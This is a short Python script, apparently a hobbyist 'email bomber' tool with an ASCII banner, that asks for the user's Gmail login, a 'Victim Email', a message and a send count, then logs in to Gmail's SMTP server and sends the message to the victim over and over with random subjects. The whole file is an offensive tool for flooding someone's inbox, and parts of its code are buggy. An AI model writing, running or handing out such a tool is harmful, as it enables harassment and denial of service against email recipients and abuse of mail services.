# -*- coding: utf-8 -*-
#=========================================================================================================================================

import os
import random
import smtplib
import sys
import getpass
import time
# ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ Welcome ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
os.system('clear')
print ('''
\033[92m
                                                        
@@@@@@@@@@   @@@@@@@    @@@@@@   @@@@@@@@@@   @@@@@@@   
@@@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  
@@! @@! @@!  @@!  @@@  @@!  @@@  @@! @@! @@!  @@!  @@@  
!@! !@! !@!  !@   @!@  !@!  @!@  !@! !@! !@!  !@   @!@  
@!! !!@ @!@  @!@!@!@   @!@  !@!  @!! !!@ @!@  @!@!@!@   
!@!   ! !@!  !!!@!!!!  !@!  !!!  !@!   ! !@!  !!!@!!!!  
!!:     !!:  !!:  !!!  !!:  !!!  !!:     !!:  !!:  !!!  
:!:     :!:  :!:  !:!  :!:  !:!  :!:     :!:  :!:  !:!  
:::     ::    :: ::::  ::::: ::  :::     ::    :: ::::  
 :      :    :: : ::    : :  :    :      :    :: : ::   
                                                        

                       ©copyright by \033[93mEngine Ripper \033[97m

''')
print(" ")

# ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■  Information ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■

# ■■■■■■■■■■■■■■■■■■■ Please, On Your Less Secure Option From Gmail ■■■■■■■■■■■■■■■■■


user = raw_input('\033[92mYour \033[92mGmail\033[97m :\033[94m ')
Password = getpass.getpass('\033[92mYour \033[92mPassword\033[97m :\033[94m ')
print(" ")
sender = raw_input('\033[91mTo Victim \033[91mEmail\033[97m : \033[94m')
message = raw_input('\033[92mYour \033[92mMessage\033[97m : \033[94m')
print(" ")
color = input('\033[92mNumber of \033[92msend\033[97m : \033[94m')
print(" ")
print("\033[94m📮\033[92mSending : ")


############################### SMTP_SERVER INFO ##################
smtp_server = 'smtp.gmail.com'
port = 587

##########################  Login ############################
try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()

    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,Password)

#■■■■■■■■■■■■■■■■■■■■■■■■■■■ Sending ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■

    for i in range(1, color+1):
        subject = os.urandom(9)
        message = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
        server.sendmail(user, sender, message)
        print ("\033[94m☑\033[97m Email \033[92mSENT\033[97m  :\033[93m %i") % i
        sys.stdout.flush()
    server.quit()
    print ('\033[93m☑\033[97m All \033[97mMessage was\033[92m sent\033[97m ')
    
    
except KeyboardInterrupt:
    print ('[✘] Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print(" ")
    print("\033[94m⚠️\033[91mError \033[97m:")
    print ('\033[94m⚠️\033[97mThe \033[93musername \033[97mor \033[93mpassword \033[97myou entered is incorrect.')
    print ("\033[94m⚠️\033[91mCheck if the Options of 'Applications are less secure' is enabled\nCheck at https://myaccount.google.com/lesssecureapps")
    sys.exit()